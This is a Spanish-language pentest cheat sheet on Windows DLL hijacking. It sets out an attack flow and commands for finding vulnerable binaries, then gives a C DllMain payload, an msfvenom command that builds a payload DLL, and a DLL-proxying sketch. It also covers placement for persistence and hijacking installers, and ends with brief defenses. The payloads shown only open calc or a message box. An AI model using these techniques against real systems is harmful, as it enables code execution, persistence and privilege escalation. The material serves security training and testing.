## 🧠 Concepto

**DLL Hijacking** (secuestro de DLL): técnica que consiste en aprovechar cómo Windows carga bibliotecas dinámicas (DLL) para ejecutar una DLL maliciosa colocada en una ruta controlada por el atacante.

* Windows busca DLLs en un orden específico (search order).
* Si no encuentra la original, carga la maliciosa.
* El binario vulnerable debe:

  * Cargar una DLL sin ruta absoluta.
  * Tener privilegios elevados (idealmente).
  * Ser ejecutado automáticamente (opcional, para persistencia).

---

## 🔁 Flujo de Ataque

```text
[1] Identificar binario vulnerable (ej. que cargue DLLs sin ruta absoluta)
[2] Determinar nombre de DLL faltante / buscada
[3] Crear DLL maliciosa con entrada 'DllMain'
[4] Colocar DLL en ruta con prioridad (ej. mismo directorio que el binario)
[5] Ejecutar el binario => carga de nuestra DLL => ejecución de payload
```

---

## 🔍 Identificación de binarios vulnerables

### Manual

```powershell
# Buscar binarios firmados por Microsoft (útiles para LOLBins)
Get-ChildItem -Path "C:\Windows\" -Recurse -Include *.exe -ErrorAction SilentlyContinue |
Where-Object { ($_ -is [System.IO.FileInfo]) -and ($_ | Get-AuthenticodeSignature).SignerCertificate.Subject -match "Microsoft" }

# Buscar ejecutables con DLLs faltantes (Sysinternals)
Strings.exe app.exe | findstr /i ".dll"
```

### Automatizado

```bash
# Windows
procmon.exe         # Filtra por "NAME NOT FOUND" y extensión ".dll"
Process Monitor (Sysinternals)

# Linux (WINE, o binarios extraídos)
PE-bear              # Analiza imports
die.py               # Detecta binarios portables, DLL, etc.
```

---

## 🧰 Herramientas Útiles

* `procmon.exe` (Sysinternals) → Monitoreo de DLLs cargadas
* `Process Explorer` → Ver dependencias en ejecución
* `Dependency Walker (depends.exe)` → Analiza qué DLLs requiere un binario
* `CFF Explorer` o `PE-bear` → Análisis y edición de binarios PE
* `DLL Export Viewer` → Ver funciones exportadas
* `Inno Setup Extractor` → Extrae contenido de instaladores .exe
* `sigcheck.exe` → Validar firmas digitales

---

## 🧪 Desarrollo de DLL Maliciosa (Payload)

### DLL mínima en C

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    MessageBox(NULL, "DLL Hijacked!", "Pwned", MB_OK);
    // system("calc.exe"); // opcional
  }
  return TRUE;
}
```

### Compilar en Windows

```bash
x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c
```

### También puedes usar MSFVenom:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o payload.dll
```

---

## ⚙️ Ubicación de la DLL

* **Mismo directorio** que el ejecutable vulnerable (tiene prioridad).
* En rutas controladas por el atacante si hay PATH UNC o configuraciones maliciosas.
* A veces puedes colocarlas en `%ProgramData%`, `%Temp%` o claves de *Run* para persistencia.

---

## 🧬 DLL Proxying (Avanzado)

* Técnica para no romper la funcionalidad original: tu DLL exporta las funciones legítimas y luego ejecuta tu payload.
* Útil para aplicaciones que requieren respuesta correcta de la DLL original.

```c
#pragma comment(lib, "original.dll")

void hijacked_function() {
  // Payload aquí
  system("calc.exe");
  // Luego llamar a la original
  original_function();
}
```

---

## 🎯 DLL Hijacking en Instaladores

Algunos instaladores llaman DLLs durante el proceso de instalación:

1. Extrae los binarios `.exe` y `.msi` → analiza dependencias.
2. Reemplaza DLL en carpeta temporal o al lado del instalador.
3. Ejecuta el instalador.

---

## 🛡️ Defensa / Detección

* Utilizar rutas absolutas al cargar DLLs.
* Firmar DLLs y validar su integridad.
* Aplicar el flag `LOAD_LIBRARY_SEARCH_SYSTEM32` en desarrollos seguros.
* Monitorizar con Sysmon, EDRs y reglas YARA.
